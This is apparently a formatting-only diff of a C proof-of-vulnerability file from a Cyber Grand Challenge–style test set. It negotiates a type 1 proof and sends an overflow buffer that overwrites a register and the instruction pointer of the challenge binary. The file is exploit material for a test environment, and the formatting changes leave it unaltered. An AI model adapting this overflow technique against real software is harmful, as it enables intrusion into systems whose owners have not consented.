@@ -24,20 +24,19 @@ THE SOFTWARE.
 
 */
 
-#include <libpov.h>
 #include <libcgc.h>
+#include <libpov.h>
 
-#define TO_CB   1
+#define TO_CB 1
 #define FROM_CB 0
-#define TO_SF   3
+#define TO_SF 3
 #define FROM_SF 3
-
 
 int SendToCB(char *buf, int length) {
   int total_sent = 0;
   int ret;
   size_t bytes_sent = 0;
-  while(total_sent < length) {
+  while (total_sent < length) {
     ret = transmit(TO_CB, buf + total_sent, length - total_sent, &bytes_sent);
     if (ret != 0) {
       // error
@@ -56,7 +55,8 @@ int ReceiveFromCB(char *buf, int length) {
   size_t bytes_received = 0;
   int ret;
   while (total_received < length) {
-    ret = receive(FROM_CB, buf + total_received , length - total_received , &bytes_received);
+    ret = receive(FROM_CB, buf + total_received, length - total_received,
+                  &bytes_received);
     if (ret != 0) {
       return -1;
     }
@@ -74,7 +74,9 @@ int main(void) {
   type1_negotiate(0xEEEEEEEE, 0xEEEEEEEE, 5, &t1vals);
 
   // perform POV
-  char bytes[86] = "3XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXRRRRIIII\n";
+  char bytes[86] =
+      "3XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+      "XXXXXRRRRIIII\n";
   bytes[0] = 3;
   *(int *)(bytes + 77) = t1vals.regval | 0x11111111;
   *(int *)(bytes + 81) = t1vals.ipval | 0x11111111;
